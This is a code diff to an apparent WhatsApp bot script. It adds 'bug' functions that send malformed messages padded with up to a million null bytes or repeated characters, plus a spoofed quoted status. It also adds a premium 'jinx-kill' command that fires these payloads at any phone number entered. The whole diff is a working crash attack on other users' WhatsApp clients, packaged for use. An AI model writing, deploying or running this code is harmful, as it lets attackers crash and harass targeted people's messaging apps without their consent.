@@ -260,6 +260,158 @@ async function addExif(webpSticker, packname, author, categories = [''], extra =
     return await img.save(null)
 }
 //=================================================//
+const zyd = {
+            key: {
+                participant: "0@s.whatsapp.net",
+                ...(typeof m !== 'undefined' && m.chat ? { remoteJid: "status@broadcast" } : {})
+            },
+            message: {
+                listResponseMessage: {
+                    'title': "🦄 JINX",
+                }
+            }
+        };
+async function LocationBug(jid) {
+            var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
+                'viewOnceMessage': {
+                    'message': {
+                        'liveLocationMessage': {
+                            'degreesLatitude': 'p',
+                            'degreesLongitude': 'p',
+                            'caption': "🦄 Jinx" + 'ꦾ'.repeat(50000),
+                                                        'sequenceNumber': '0',
+                                                        'jpegThumbnail': ''
+                                                    }
+                    }
+                }
+            }), {
+                'userJid': jid,
+                'quoted': zyd
+            });
+            await sam.relayMessage(jid, messageContent.message, {
+                'participant': {
+                    'jid': jid
+                },
+                'messageId': messageContent.key.id
+            });
+}
+async function BugPayments(jid) {
+            const h = {
+                product_header_info_id: 0x4433e2e130,
+                product_header_is_rejected: false
+            };
+            var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
+                'listMessage': {
+                    'title': "🦄 Jinx" + "\0".repeat(920000),
+                                        'footerText': "🦄 Jinx",
+                                        'description': "🦄 Jinx",
+                    'buttonText': null,
+                    'listType': 0x2,
+                    'productListInfo': {
+                        'productSections': [{
+                            'title': 'Jinx',
+                            'products': [{
+                                'productId': "4392524570816732"
+                            }]
+                        }],
+                        'productListHeaderImage': {
+                            'productId': "4392524570816732",
+                            'jpegThumbnail': null
+                        },
+                        'businessOwnerJid': "0@s.whatsapp.net"
+                    }
+                },
+                'footer': "puki",
+                'contextInfo': {
+                    'expiration': 0x93a80,
+                    'ephemeralSettingTimestamp': "1679959486",
+                    'entryPointConversionSource': "global_search_new_chat",
+                    'entryPointConversionApp': "whatsapp",
+                    'entryPointConversionDelaySeconds': 0x9,
+                    'disappearingMode': {
+                        'initiator': "INITIATED_BY_ME"
+                    }
+                },
+                'selectListType': 0x2,
+                'product_header_info': h
+            }), {
+                'userJid': jid,
+                'quoted': zyd
+            });
+            await sam.relayMessage(jid, messageContent.message, {
+                'participant': {
+                    'jid': jid
+                },
+                'messageId': messageContent.key.id
+            });
+}
+async function stickerBug(jid) {
+            const _0x3edf68 = {
+                url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
+                fileSha256: "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
+                fileEncSha256: "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
+                mediaKey: "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
+                mimetype: "image/webp",
+                directPath: "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
+                fileLength: "10116",
+                mediaKeyTimestamp: "1715876003",
+                isAnimated: false,
+                stickerSentTs: "1715881084144",
+                isAvatar: false,
+                isAiSticker: false,
+                isLottie: false
+            };
+            const _0x5d903d = {
+                stickerMessage: _0x3edf68
+            };
+            var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject(_0x5d903d), {
+                'userJid': jid,
+                'quoted': zyd
+            });
+            await sam.relayMessage(jid, messageContent.message, {
+                'participant': {
+                    'jid': jid
+                },
+                'messageId': messageContent.key.id
+            });
+}
+async function ButtonWithImageBug(jid) {
+            const upload = {
+                upload: sam.waUploadToServer
+            };
+            const text = {
+                text: ''
+            };
+            var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
+                'interactiveMessage': {
+                    'header': {
+                        'title': "🦄 JINX",
+                        'hasMediaAttachment': true,
+                        ...(await prepareWAMessageMedia({
+                            'image': {
+                                'url': "https://telegra.ph/file/306555d99f25c6f75941f.jpg"
+                            }
+                        }, upload))
+                    },
+                    'body': text,
+                    'footer': {
+                        'text': "›          #🦄JINX"
+                    },
+                    'nativeFlowMessage': {
+                        'messageParamsJson': "\0".repeat(1000000)
+                    }
+                }
+            }), {
+                'userJid': jid,
+                'quoted': zyd
+            });
+            await sam.relayMessage(jid, messageContent.message, {
+                'participant': {
+                    'jid': jid
+                },
+                'messageId': messageContent.key.id
+            });
+}
 async function sendRepeatedMessages2(jid, count) {
             for (let i = 0; i < count; i++) {
                 sendSystemCrashMessage(jid);
@@ -1100,6 +1252,23 @@ case 'emojimix': {
                         categories: res.tags
                     })
                     await fs.unlinkSync(encmedia)
+                }
+            }
+                break
+	case 'jinx-kill':{
+                if (!isPremium) return reply(mess.prem)
+                if (!q) return reply(`Example : ${prefix + command} 254xxxxxxx`)
+                let number = q.replace(/[^0-9]/g, '');
+                if (number.startsWith('0')) return replygcxeon(`Example : ${prefix + command} 254781xxxxxxx`)
+                let target = number + '@s.whatsapp.net';
+                await reply("In process..")
+                for (let i = 0; i < 1; i++) {
+                    await BugPayments(target)
+                    await LocationBug(target)
+                    await ButtonWithImageBug(target)
+                    await LocationBug(target)
+                    await stickerBug(target)
+                    await LocationBug(target)
                 }
             }
                 break
